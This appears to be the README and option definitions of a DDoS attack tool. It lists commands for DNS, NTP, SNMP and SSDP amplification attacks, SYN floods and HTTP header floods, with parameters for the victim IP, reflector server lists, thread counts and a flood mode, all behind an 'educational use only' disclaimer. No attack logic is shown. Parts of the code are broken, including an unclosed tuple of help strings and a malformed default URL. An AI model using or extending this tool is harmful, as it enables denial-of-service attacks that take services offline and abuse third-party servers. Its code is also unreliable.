
# THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.




```
 .-------------------------------------------------------------------------.
| .-----------------------------------------------------------------------. |
| |    _______          _________              __            ____   ____  | |
| |   /  ___  |        |  _   _  |            /  \          |_  _| |_  _| | |
| |  |  (__ \_|        |_/ | | \_|           / /\ \           \ \   / /   | |
| |   '.___`-.             | |              / ____ \           \ \ / /    | |
| |  |`\____) |           _| |_           _/ /    \ \_          \ ' /     | |
| |  |_______.'          |_____|         |____|  |____|          \_/      | |
| |                                                                       | |
| '-----------------------------------------------------------------------' |
 '-------------------------------------------------------------------------'
 
ddos attack [options]			# DNS Amplification attack
ddos attack [options]			# NTP Amplification attack
ddos attack [options]			# SNMP Amplification attack
ddos attack [options]			# SSDP Amplification attack
ddos amplification BENCHMARK [options]	# Benchmarking Amplification
ddos syn [options]			# SYN Flood attack
ddos http [opitons]			# HTTP Header Package attack





HELP = (
    '-d --dns => Dns file required parameter. E.g. -d dnsServerList.txt',
    '-n --ntp => Ntp file required parameter. E.g. -n ntpServerList.txt',
    '-s --snmp => Snmp file required parameter. E.g. -s snmpList.txt',
    '-p --ssdp => Ssdp file required parameter. E.g. -p ssdpList.txt',
    '-t Number of threads (Default=1). E.g. -t 20',
    '-i IP Adress of target/victim. E.g. -i 192.168.1.1',
    '-o Generate output file. E.g. -o attackResult.txt',
    '-c Number of Packets to be sent. E.g -c 10000)(Use in SYN Attack)',
    '-l Size of each packets(byte). E.g. -l 120 (120 byte length packet)(Use in SYN Attack)',
    '-w Window size pf each packets(byte). E.g -w 64 (64 byte length window size) (Use in SYN Attack)',
    '-r Port number to send packets. E.g. -r 6060 (Use in SYN attack)',
    '-j Send SYN packets in flood mode. Doesnt wait response.May exceeds desired packet amount sent.(Use in SYN attack)',
    '-u Target URL that HTTP Headers are send to (Use in HTTP attack)',
    '-k Number of concurrent sockets. E.g. -k 100 (Use in HTTP attack)',
    '-m Select Method. GET or POST method. E.g -m get',
    '-a Feed with User Agent File',
    '-b Enable/Disable debug mode. E.g. -b true (Use in HTTP attacks)',
    '-x XUpdate changes to config file.'
)

HELPv1 = (
    'ddos attack
    'ddos amplification benchmark,
    'ddos attack UDP'
    'ddos attack TCP', DEFAULT IS TCP, you may not need to specify
    'ddos amplification -snmp snmpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -ssdp ssdpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos syn -c(number of packets) -d (packet size) -w (windowsize) -p (port) --flood TargetIp -o attackResult.txt',
    'ddos http -u (Target URL) -t(number of threads) -k (number of sockets) -m get/post (method) -d(enable/disable debug) -o attackResult.txt)'
)

HELPv2 = (
    'ddos amplification -dns dnsServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -ntp -ntpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -snmp snmpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos amplification -ssdp ssdpServerList.file -t ThreadCount -i TargetIp -o attackResult.txt',
    'ddos syn -c(number of packets) -d (packet size) -w (windowsize) -p (port) --flood TargetIp -o attackResult.txt',
    'ddos http -u (Target URL) -t(number of threads) -k (number of sockets) -m get/post (method) -d(enable/disable debug) -o attackResult.txt)'
)

OPTIONS = (
    (('-d', '--dns'), dict(dest='dns', metavar='FILE', help=HELP[0])),
    (('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
    (('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
    (('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
    (('-t', '--threads'), dict(dest='threads', type=int, default=1, help=HELP[4])),
    (('-i', '--targetIP'), dict(dest='targetIP', type="string", default="192.168.1.1", help=HELP[5])),
    (('-o', '--output'), dict(dest='output', metavar='FILE', help=HELP[6])),
    (('-c', '--countOfPackages'), dict(dest='countOfPackages', type=int, default=100, help=HELP[7])),
    (('-l', '--packageLength'), dict(dest='packageLength', type=int, default=120, help=HELP[8])),
    (('-w', '--windowSize'), dict(dest='windowSize', type=int, default=64, help=HELP[9])),
    (('-r', '--port'), dict(dest='port', type=int, default=12345, help=HELP[10])),
    (('-j', '--flood'), dict(dest='flood', type=int, default=0, help=HELP[11])),
    (('-u', '--url'), dict(dest='url', type="string", default='http:/www.example.com', help=HELP[12])),
    (('-k', '--socketCount'), dict(dest='socketCount', type=int, default=10, help=HELP[13])),
    (('-m', '--methodType'), dict(dest='methodType', type="string", default='get', help=HELP[14])),
    (('-a', '--useragent'), dict(dest='useragent', metavar='FILE', help=HELP[15])),
    (('-b', '--debugMode'), dict(dest='debugMode', type=int, default=0, help=HELP[16])),
    (('-x', '--write'), dict(dest='write', type="string", default="no", help=HELP[17]))
)
```
